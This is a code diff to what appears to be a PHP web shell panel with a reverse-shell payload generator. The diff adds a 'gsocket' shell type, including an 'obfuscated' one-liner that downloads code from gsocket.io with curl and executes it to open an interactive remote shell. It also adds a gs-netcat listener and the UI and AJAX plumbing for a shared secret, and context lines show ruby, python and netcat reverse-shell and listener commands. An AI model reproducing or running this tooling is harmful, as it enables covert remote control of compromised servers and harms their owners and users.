@@ -796,6 +796,14 @@ class ReverseShellGenerator {
                    . "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)";
                 return "ruby -e '{$p}'";
 
+            case 'gsocket':
+                $secret = isset($options['gs_secret']) && $options['gs_secret'] !== '' ? $options['gs_secret'] : 'MySecret';
+                $secret = escapeshellarg($secret);
+                if ($obfuscate) {
+                    return "bash -c '\$(curl -fsSL gsocket.io/x) -s {$secret} -i'";
+                }
+                return "gs-netcat -s {$secret} -i";
+
             default:
                 return '';
         }
@@ -839,7 +847,7 @@ class ReverseShellGenerator {
         );
     }
 
-    public static function generate_listener($listener_type, $listener_port) {
+    public static function generate_listener($listener_type, $listener_port, $gs_secret = '') {
         $port = intval($listener_port);
 
         switch ($listener_type) {
@@ -855,13 +863,17 @@ class ReverseShellGenerator {
                 return "while true; do nc -lvnp {$port}; done";
             case 'python':
                 return "python3 -c 'import socket,sys;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\"0.0.0.0\",{$port}));s.listen(1);print(\"Listening on 0.0.0.0:{$port}\");c,a=s.accept();print(\"Connection from\",a);sys.stdin=c.makefile(\"r\");sys.stdout=c.makefile(\"w\");sys.stderr=c.makefile(\"w\")'";
+            case 'gsocket':
+                $secret = $gs_secret !== '' ? $gs_secret : 'MySecret';
+                $secret = escapeshellarg($secret);
+                return "gs-netcat -s {$secret} -i -l";
             default:
                 return "nc -lvnp {$port}";
         }
     }
 
     public static function get_shell_types() {
-        return array('bash', 'sh', 'python', 'python3', 'perl', 'php', 'nc', 'powershell', 'ruby');
+        return array('bash', 'sh', 'python', 'python3', 'perl', 'php', 'nc', 'powershell', 'ruby', 'gsocket');
     }
 
     public static function get_encodings() {
@@ -869,7 +881,7 @@ class ReverseShellGenerator {
     }
 
     public static function get_listeners() {
-        return array('nc', 'ncat', 'socat', 'msfconsole', 'bash', 'python');
+        return array('nc', 'ncat', 'socat', 'msfconsole', 'bash', 'python', 'gsocket');
     }
 }
 
@@ -6272,6 +6284,9 @@ if (isset($_GET['action']) && strpos($_GET['action'], 'revshell_') === 0) {
                 if ($shell_type === 'nc') {
                     $options['nc_type'] = isset($_POST['nc_type']) ? $_POST['nc_type'] : 'standard';
                 }
+                if ($shell_type === 'gsocket') {
+                    $options['gs_secret'] = isset($_POST['gs_secret']) ? $_POST['gs_secret'] : '';
+                }
 
                 $result = ReverseShellGenerator::generate($shell_type, $lhost, $lport, $encoding, $options);
                 echo json_encode($result);
@@ -6280,8 +6295,9 @@ if (isset($_GET['action']) && strpos($_GET['action'], 'revshell_') === 0) {
             case 'revshell_listener':
                 $listener_type = isset($_POST['listener_type']) ? $_POST['listener_type'] : (isset($_GET['listener_type']) ? $_GET['listener_type'] : 'nc');
                 $listener_port = isset($_POST['listener_port']) ? $_POST['listener_port'] : (isset($_GET['listener_port']) ? $_GET['listener_port'] : 4444);
+                $gs_secret = isset($_POST['gs_secret']) ? $_POST['gs_secret'] : '';
 
-                $command = ReverseShellGenerator::generate_listener($listener_type, $listener_port);
+                $command = ReverseShellGenerator::generate_listener($listener_type, $listener_port, $gs_secret);
                 echo json_encode([
                     'success' => true,
                     'command' => $command,
@@ -8555,7 +8571,7 @@ tr:hover td{background:rgba(0,255,64,.035);}
       </div>
       <div style="display:flex;gap:6px;margin-bottom:6px;align-items:end;">
         <div class="field" style="flex:1;margin:0;"><label>Shell</label>
-          <select id="rsShellType" onchange="updateRSOptions()" style="padding:5px 6px;font-size:11.5px;"><option value="bash">Bash</option><option value="sh">Sh</option><option value="python">Python2</option><option value="python3">Python3</option><option value="perl">Perl</option><option value="php">PHP</option><option value="nc">Netcat</option><option value="powershell">PowerShell</option><option value="ruby">Ruby</option></select>
+          <select id="rsShellType" onchange="updateRSOptions()" style="padding:5px 6px;font-size:11.5px;"><option value="bash">Bash</option><option value="sh">Sh</option><option value="python">Python2</option><option value="python3">Python3</option><option value="perl">Perl</option><option value="php">PHP</option><option value="nc">Netcat</option><option value="powershell">PowerShell</option><option value="ruby">Ruby</option><option value="gsocket">GSocket</option></select>
         </div>
         <div class="field" style="flex:1;margin:0;"><label>Encode</label>
           <select id="rsEncoding" style="padding:5px 6px;font-size:11.5px;"><option value="none">None</option><option value="base64">Base64</option><option value="urlencode">URL</option><option value="hex">Hex</option></select>
@@ -8564,6 +8580,9 @@ tr:hover td{background:rgba(0,255,64,.035);}
       </div>
       <div class="field hidden" id="rsNcOptions" style="margin:0 0 6px;"><label>NC Variant</label>
         <select id="rsNcType" style="padding:5px 6px;font-size:11.5px;"><option value="standard">GNU nc</option><option value="ncat">Ncat</option><option value="openbsd">OpenBSD</option></select>
+      </div>
+      <div class="field hidden" id="rsGsOptions" style="margin:0 0 6px;"><label>GSocket Secret</label>
+        <input type="text" id="rsGsSecret" placeholder="MySecret123" style="padding:5px 8px;font-size:11.5px;">
       </div>
       <button class="btn" onclick="generateReverseShellPayload()" style="width:100%;padding:6px;font-size:11.5px;margin-bottom:6px;">Generate Payload</button>
       <div id="rsOutputTabs" class="hidden" style="margin-bottom:8px;">
@@ -8579,7 +8598,7 @@ tr:hover td{background:rgba(0,255,64,.035);}
       <div class="section-title" style="margin:0 0 6px;">LISTENER</div>
       <div style="display:flex;gap:6px;margin-bottom:6px;">
         <div class="field" style="flex:2;margin:0;"><label>Type</label>
-          <select id="rsListenerType" style="padding:5px 6px;font-size:11.5px;"><option value="nc">Netcat</option><option value="ncat">Ncat</option><option value="socat">Socat</option><option value="msfconsole">Metasploit</option><option value="bash">Bash</option><option value="python">Python</option></select>
+          <select id="rsListenerType" style="padding:5px 6px;font-size:11.5px;"><option value="nc">Netcat</option><option value="ncat">Ncat</option><option value="socat">Socat</option><option value="msfconsole">Metasploit</option><option value="bash">Bash</option><option value="python">Python</option><option value="gsocket">GSocket</option></select>
         </div>
         <div class="field" style="flex:1;margin:0;"><label>Port</label><input type="number" id="rsListenerPort" value="4444" min="1" max="65535" style="padding:5px 8px;font-size:11.5px;"></div>
       </div>
@@ -12241,12 +12260,8 @@ function extendSession() {
 
 function updateRSOptions() {
     const shellType = document.getElementById('rsShellType').value;
-    const ncOptions = document.getElementById('rsNcOptions');
-    if (shellType === 'nc') {
-        ncOptions.classList.remove('hidden');
-    } else {
-        ncOptions.classList.add('hidden');
-    }
+    document.getElementById('rsNcOptions').classList.toggle('hidden', shellType !== 'nc');
+    document.getElementById('rsGsOptions').classList.toggle('hidden', shellType !== 'gsocket');
 }
 
 async function generateReverseShellPayload() {
@@ -12280,6 +12295,9 @@ async function generateReverseShellPayload() {
         if (shellType === 'nc') {
             formData.append('nc_type', document.getElementById('rsNcType').value);
         }
+        if (shellType === 'gsocket') {
+            formData.append('gs_secret', document.getElementById('rsGsSecret').value.trim());
+        }
 
         const response = await fetch('?masuk=al&action=revshell_generate', {
             method: 'POST',
@@ -12303,11 +12321,9 @@ async function generateReverseShellPayload() {
             document.getElementById('rsEncodedPayload').textContent = data.encoded;
             document.getElementById('rsEncodedPayload').classList.add('hidden');
             document.getElementById('rsEncodedTabBtn').style.display = 'block';
-            document.getElementById('rsCopyEncodedBtn').classList.add('hidden');
         } else {
             document.getElementById('rsEncodedPayload').classList.add('hidden');
             document.getElementById('rsEncodedTabBtn').style.display = 'none';
-            document.getElementById('rsCopyEncodedBtn').classList.add('hidden');
         }
 
         switchRSTab('original');
@@ -12321,7 +12337,6 @@ async function generateReverseShellPayload() {
 function switchRSTab(tabName) {
     document.getElementById('rsOriginalPayload').classList.add('hidden');
     document.getElementById('rsEncodedPayload').classList.add('hidden');
-    document.getElementById('rsCopyEncodedBtn').classList.add('hidden');
     document.querySelectorAll('.rs-tab-btn').forEach(btn => {
         btn.style.color = 'var(--text-dim)';
         btn.style.borderBottom = '2px solid transparent';
@@ -12333,7 +12348,6 @@ function switchRSTab(tabName) {
         document.querySelector('[onclick*="switchRSTab(\'original\')"]').style.borderBottom = '2px solid var(--primary)';
     } else {
         document.getElementById('rsEncodedPayload').classList.remove('hidden');
-        document.getElementById('rsCopyEncodedBtn').classList.remove('hidden');
         document.querySelector('[onclick*="switchRSTab(\'encoded\')"]').style.color = 'var(--primary)';
         document.querySelector('[onclick*="switchRSTab(\'encoded\')"]').style.borderBottom = '2px solid var(--primary)';
     }
@@ -12355,6 +12369,9 @@ async function generateReverseShellListener() {
         const formData = new FormData();
         formData.append('listener_type', listenerType);
         formData.append('listener_port', lport);
+        if (listenerType === 'gsocket') {
+            formData.append('gs_secret', document.getElementById('rsGsSecret').value.trim());
+        }
 
         const response = await fetch('?masuk=al&action=revshell_listener', {
             method: 'POST',
@@ -12371,7 +12388,6 @@ async function generateReverseShellListener() {
 
         document.getElementById('rsListenerOutput').textContent = data.command;
         document.getElementById('rsListenerOutput').classList.remove('hidden');
-        document.getElementById('rsCopyListenerBtn').classList.remove('hidden');
         errorDiv.classList.add('hidden');
 
     } catch (error) {
@@ -12411,7 +12427,6 @@ async function decodeReverseShellPayload() {
 
         document.getElementById('rsDecodeOutput').textContent = data.decoded || 'Failed to decode';
         document.getElementById('rsDecodeOutput').classList.remove('hidden');
-        document.getElementById('rsCopyDecodeBtn').classList.remove('hidden');
         errorDiv.classList.add('hidden');
 
     } catch (error) {
